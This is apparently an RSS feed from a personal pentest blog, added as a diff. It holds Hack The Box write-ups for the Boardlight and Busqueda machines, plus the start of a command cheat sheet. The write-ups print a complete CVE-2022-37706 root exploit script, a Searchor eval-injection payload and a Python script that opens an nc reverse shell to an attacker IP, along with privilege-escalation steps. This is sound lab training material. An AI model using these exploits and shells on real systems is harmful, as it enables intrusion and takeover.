@@ -1,0 +1,967 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on TheFizzyFish-blog</title>
+        <link>http://localhost:1313/posts/</link>
+        <description>Recent content in Posts on TheFizzyFish-blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Sat, 24 Aug 2024 16:50:47 -0400</lastBuildDate>
+        <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Boardlight</title>
+            <link>http://localhost:1313/posts/boardlight/</link>
+            <pubDate>Sat, 24 Aug 2024 16:50:47 -0400</pubDate>
+            
+            <guid>http://localhost:1313/posts/boardlight/</guid>
+            <description>HTB - Linux - Easy</description>
+            <content type="html"><![CDATA[<p>A Really easy HTB box that looks into vhost enumeration and a CVE 2023-30253.</p>
+<h1 id="enum">Enum</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h2 id="80">80</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/BoardLight<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ whatweb $IP     
+</span></span><span style="display:flex;"><span>http://10.10.11.11 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.41<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>info@board.htb<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.11<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>3.4.1<span style="color:#f92672">]</span>, Script<span style="color:#f92672">[</span>text/javascript<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>This took a while :( but have to check for vhosts when you have a domain.</p>
+<p>We can us ffuf to do this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/BoardLight<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb -H <span style="color:#e6db74">&#39;Host: FUZZ.board.htb&#39;</span> -fs <span style="color:#ae81ff">15949</span>
+</span></span></code></pre></div><p>And we find one! <code>crm.board.htb</code>, we need to add it to our hosts file then we can browse to it directly</p>
+<p>Looking through the source, we see some comments but I don&rsquo;t think these will help us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- authentication mode = dolibarr --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- cookie name used for this session = DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92 --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- urlfrom in this session =  --&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Common footer is not used for login page, this is same than footer but inside login tpl --&gt;</span>
+</span></span></code></pre></div><p>A google search shows multiple exploits and a CVE(2023-30253):</p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p>We found the site is running a vulnerable version of Dolibarr a CRM with a RCE exploit available but it requires a valid username and password.</p>
+<p>Trying the low hanging fruit <code>admin:admin</code> gets us in and we can run the first github exploit result after reading through the python code.</p>
+<p>We&rsquo;re going to want to look for a config file because we know the app interfaces with mysql we might be able to find some hardcoded creds, linpeas doesn&rsquo;t pick up anything but if we look at the documentation for dolibarr we find it at <code>/var/www/html/crm.board.htb/htdocs/conf/conf.php</code></p>
+<p><a href="https://wiki.dolibarr.org/index.php?title=Configuration_file">https://wiki.dolibarr.org/index.php?title=Configuration_file</a></p>
+<p>And we get a potential password:</p>
+<p><code>serverfun2$2023!!</code></p>
+<p>We could potentially log into the database and look for anything else interesting or we can check for password re-use. We did find another user on  the box <code>larissa</code>.</p>
+<p>Logging in with the cred above as larissa works!</p>
+<h2 id="exploits">Exploits</h2>
+<p>#CVE-2023-30253
+<a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a></p>
+<hr>
+<h1 id="privesc">PrivEsc</h1>
+<p>Running linpeas again finds some interesting SUID binaries</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root 27K Jan <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys <span style="color:#f92672">(</span>Unknown SUID binary!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root 15K Jan <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd <span style="color:#f92672">(</span>Unknown SUID binary!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root 15K Jan <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight <span style="color:#f92672">(</span>Unknown SUID binary!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root 15K Jan <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset <span style="color:#f92672">(</span>Unknown SUID binary!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/bash</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Idea by MaherAzzouz</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Development by nu11secur1ty</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;CVE-2022-37706&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[*] Trying to find the vulnerable SUID file...&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[*] This may take few seconds...&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The actual problem</span>
+</span></span><span style="display:flex;"><span>file<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | head -1<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -z <span style="color:#e6db74">${</span>file<span style="color:#e6db74">}</span> <span style="color:#f92672">]]</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>	echo <span style="color:#e6db74">&#34;[-] Couldn&#39;t find the vulnerable SUID file...&#34;</span>
+</span></span><span style="display:flex;"><span>	echo <span style="color:#e6db74">&#34;[*] Enlightenment should be installed on your system.&#34;</span>
+</span></span><span style="display:flex;"><span>	exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Vulnerable SUID binary found!&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Trying to pop a root shell!&#34;</span>
+</span></span><span style="display:flex;"><span>mkdir -p /tmp/net
+</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#e6db74">&#34;/dev/../tmp/;/tmp/exploit&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; /tmp/exploit
+</span></span><span style="display:flex;"><span>chmod a+x /tmp/exploit
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Welcome to the rabbit hole :)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;If it is not found in fstab, big deal :D &#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">${</span>file<span style="color:#e6db74">}</span> /bin/mount -o noexec,nosuid,utf8,nodev,iocharset<span style="color:#f92672">=</span>utf8,utf8<span style="color:#f92672">=</span>0,utf8<span style="color:#f92672">=</span>1,uid<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>id -u<span style="color:#66d9ef">)</span>, <span style="color:#e6db74">&#34;/dev/../tmp/;/tmp/exploit&#34;</span> /tmp///net
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>read -p <span style="color:#e6db74">&#34;Press any key to clean the evedence...&#34;</span>
+</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;Please wait... &#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sleep <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>rm -rf /tmp/exploit
+</span></span><span style="display:flex;"><span>rm -rf /tmp/net
+</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;Done; Everything is clear ;)&#34;</span>
+</span></span></code></pre></div><p>We can create a exploit.sh with the exploit code, make it executable with <code>chmod +x </code>, and run it to get root.</p>
+<h2 id="exploits-1">Exploits</h2>
+<p><a href="https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2022-37706/docs/exploit.sh">https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2022-37706/docs/exploit.sh</a>
+#suid</p>
+<hr>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Busqueda</title>
+            <link>http://localhost:1313/posts/busqueda/</link>
+            <pubDate>Sat, 24 Aug 2024 16:50:47 -0400</pubDate>
+            
+            <guid>http://localhost:1313/posts/busqueda/</guid>
+            <description>HTB - Linux - Easy</description>
+            <content type="html"><![CDATA[<h1 id="enum">Enum</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.015s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 4fe3a667a227f9118dc30ed773a02c28 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 816e78766b8aea7d1babd436b7f8ecc4 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://searcher.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Find a hostname <code>searcher.htb</code>, adding to <code>/etc/hosts</code></p>
+<h1 id="80---http">80 - HTTP</h1>
+<p>If we select apple as the engine and test as the search string, it presents an URL as shown below.</p>
+<p>There&rsquo;s also an option for an auto redirect.</p>
+<p><code>Searchor 2.4.0</code></p>
+<p><a href="https://github.com/ArjunSharda/Searchor/pull/130">https://github.com/ArjunSharda/Searchor/pull/130</a></p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p><em>Exploit code</em></p>
+<p>Looking at one of the exploit links &raquo; <a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</a></p>
+<p>Due to an eval call we should be able to execute system commands via the web application.</p>
+<p>We can download the exploit script, set up a nc listener on our attacker box, then run the exploit to get a reverse shell OR we could look at the exploit code to see how it works and try to exploit the vulnerability manually.</p>
+<p>Lets try option 2.</p>
+<p>The exploit builds a reverse shell payload and base64 encodes it, and an evil_cmd variable holding python code to run a python.system command. They then use a curl request to send a POST HTTP request to the server with parameters injecting the evil_cmd into the query variable.</p>
+<p>This looks a lot simpler once we capture a request with burp suite.</p>
+<p>A captured request to the server. We&rsquo;re going to inject python code into the query variable.</p>
+<p>We can check to verify our syntax is correct by running the following python command:
+<code>engine=Apple&amp;query=&quot;',__import__('os').system('id'))#</code></p>
+<p>What this command is doing is a double quote, a single quote, and comma as formatting to break out of the expected input. Importing the python os library, running the os.system method, allowing us to run linux system commands like &lsquo;id&rsquo;.</p>
+<p>Looking at the response we see the application is running as user &lsquo;svc&rsquo;.</p>
+<p>Next we can create a reverse shell and try to get our foothold. A great tool for reverse shells is <a href="https://www.revshells.com/">https://www.revshells.com/</a>. We&rsquo;re going to want to base64 encode the payload to avoid any issues with formatting.</p>
+<p>In this case I&rsquo;ll just be using a simple bash reverse shell, using the built in function to base64 encode the payload.</p>
+<p>Don&rsquo;t forget to set up a listener.
+nc -lnvp 8443</p>
+<p>We can inject our encoded shell code within our python code, make sure to base64 decode it, and execute it with bash</p>
+<p>Send the request and check your listener!</p>
+<p>Awesome, we have a shell. We&rsquo;ll want to use some magic to get a full TTY to make our lives easier with tab complete.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#hit control z to background the shell</span>
+</span></span><span style="display:flex;"><span>stty raw -echo ; fg ; reset
+</span></span></code></pre></div><p>We can take this and write a quick python script to get a reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://searcher.htb/search&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;en-US,en;q=0.5&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept-Encoding&#39;</span>: <span style="color:#e6db74">&#39;gzip, deflate&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://searcher.htb&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;close&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://searcher.htb/&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#command = input(&#34;Enter the command to execute: &#34;)</span>
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.14.2&#39;</span>
+</span></span><span style="display:flex;"><span>lport <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;9002&#39;</span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc &#39;</span> <span style="color:#f92672">+</span> lhost <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> lport <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &gt;/tmp/f&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;engine&#39;</span>: <span style="color:#e6db74">&#39;Google&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;query&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39;,exec(__import__(&#39;os&#39;).system(&#39;</span><span style="color:#e6db74">{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)))#&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)            
+</span></span></code></pre></div><h2 id="exploits">Exploits</h2>
+<hr>
+<h1 id="privesc">PrivEsc</h1>
+<p>Now that we&rsquo;re on a stable shell on the box, lets start enumerating for priv escalation. My first step is usually to check to see where we landed and if we can find anything interesting.</p>
+<p>We immediately find a .git folder and a config file containing a username (cody), a potential password (jh1usoih2bkjaspwe92), and a new subdomain.</p>
+<p>Checking /etc/passwd we don&rsquo;t see a cody user on the box. Ip information shows we&rsquo;re likely in a docker container running the application.</p>
+<p>.git/config file with a cred. We also appear to be in a docker container based on ip info.
+<code>cody:jh1usoih2bkjaspwe92</code></p>
+<p>We can add the subdomain to our /etc/hosts file and log in to it with the creds we found</p>
+<p>This seems to be a rabbit hole as we can login as the user cody but don&rsquo;t find a way to escalate our privileges.</p>
+<p>Lets just for some password reuse and check if the svc user uses the same password as cody.</p>
+<p>Using the cred we found for cody, as we don&rsquo;t find a cody user on the box in the passwd file, we can try to check sudo privs for the <code>svc</code> user using the same password.</p>
+<p>We can run <code>/usr/bin/python3 /opt/scripts/system-checkup.py *</code></p>
+<p>Checking file permissions for the script, we see it&rsquo;s owned by root and we do not have the ability to modify or view the code.</p>
+<p>We&rsquo;ll likely have to look into the function of the script and arguments. Lets try docker-ps argument to list running containers.</p>
+<p>We find two running containers, gitea and mysql. Since this command appears to function similar to &ldquo;docker ps&rdquo;, we can guess the docker-inspect is similar to docker inspect.</p>
+<p>We can review the syntax for docker inspect here &raquo; <a href="https://docs.docker.com/reference/cli/docker/inspect/">https://docs.docker.com/reference/cli/docker/inspect/</a></p>
+<p>We can use this command to dump the config of the container with the following command:
+<code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{.Config}}' gitea</code></p>
+<p><code>administrator:yuiu1hoiu4i5ho1uh</code>
+We can then login try to login as the administrator user of the gitea instance on the web server.</p>
+<p>Success! We get access to the gitea server as the administrator user and can review the contents of the scripts folder.</p>
+<p>The contents of system-checkup.py, the command we can execute with sudo privs, shows something interesting.</p>
+<p>The full path isn&rsquo;t included when the script references <code>full-checkup.sh</code> meaning we can hijack <code>full-checkup.sh</code> with our own file in another directory. As we run the script via sudo, we should be able to get a root shell.</p>
+<p>Instead of setting up another listener and attempting to get a root shell, lets try modifying a binary we know we can use to escalate privileges with. In this case, lets use /bin/bash to get root by changing the permissions of the binary.</p>
+<p>We can change the perms for /bin/bash to SUID by creating a full-checkup.sh file with the following contents and making it executable within the tmp directory:</p>
+<pre tabindex="0"><code>#!/bin/bash
+chmod u+s /bin/bash
+</code></pre><p>We then want to run the following command to execute our hijacked full-checkup.sh script.</p>
+<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</code></p>
+<p>Next we use an simple command found on <a href="https://gtfobins.github.io/gtfobins/bash/#suid">https://gtfobins.github.io/gtfobins/bash/#suid</a> to get a root shell</p>
+<p>And we&rsquo;re done, we see our euid=0 making us effectively root! We can go and grab the root flag, submit it, and call it a day.</p>
+<h2 id="exploits-1">Exploits</h2>
+]]></content>
+        </item>
+        
+        <item>
+            <title>common.txt</title>
+            <link>http://localhost:1313/posts/commom/</link>
+            <pubDate>Sat, 24 Aug 2024 16:50:47 -0400</pubDate>
+            
+            <guid>http://localhost:1313/posts/commom/</guid>
+            <description>Command commands</description>
+            <content type="html"><![CDATA[<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># File containing common commands and techniques</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------------Terminator------------------------
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Split vertically</span>
+</span></span><span style="display:flex;"><span>CTRL + Shift + E
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Split Horizontally</span>
+</span></span><span style="display:flex;"><span>CTRL + SHIFT + O
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># New Tab</span>
+</span></span><span style="display:flex;"><span>CTRL + SHIFT + T
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------TTY Magic-----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span>TTY Magic:
+</span></span><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>tty
+</span></span><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm-256color
+</span></span><span style="display:flex;"><span>alias ll<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;clear ; ls -lsaht --color=auto&#39;</span>
+</span></span><span style="display:flex;"><span>Ctrl + Z <span style="color:#f92672">(</span>Background Process<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>stty -a 
+</span></span><span style="display:flex;"><span>stty raw -echo ; fg ; reset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set rows and columns</span>
+</span></span><span style="display:flex;"><span>stty rows <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>stty columns <span style="color:#ae81ff">148</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>----------------------------NMAP-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nmap -p- -T5 -oN all-ports.nmap $IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nmap -p &lt;ports list&gt; -A $IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------WEB CONTENT ---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>Fuzz Directories:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>feroxbuster --url http://192.168.220.225:8090 -o ferox-8090.out -x php,html,txt -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc <span style="color:#ae81ff">404</span> <span style="color:#e6db74">&#34;</span>$URL<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>Fuzz Files:
+</span></span><span style="display:flex;"><span>wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc <span style="color:#ae81ff">404</span> <span style="color:#e6db74">&#34;</span>$URL<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>Authenticated Fuzz Directories:
+</span></span><span style="display:flex;"><span>wfuzz -c -z file,/opt/SecLists/DiscoveryWeb-Content/raft-medium-directories.txt --hc <span style="color:#ae81ff">404</span> -d <span style="color:#e6db74">&#34;PARAM=value&#34;</span> <span style="color:#e6db74">&#34;</span>$URL<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span>Fuzz Parameters:
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exclude byte length for params that don&#39;t exist with -hh</span>
+</span></span><span style="display:flex;"><span>wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt <span style="color:#e6db74">&#34;</span>$URL<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
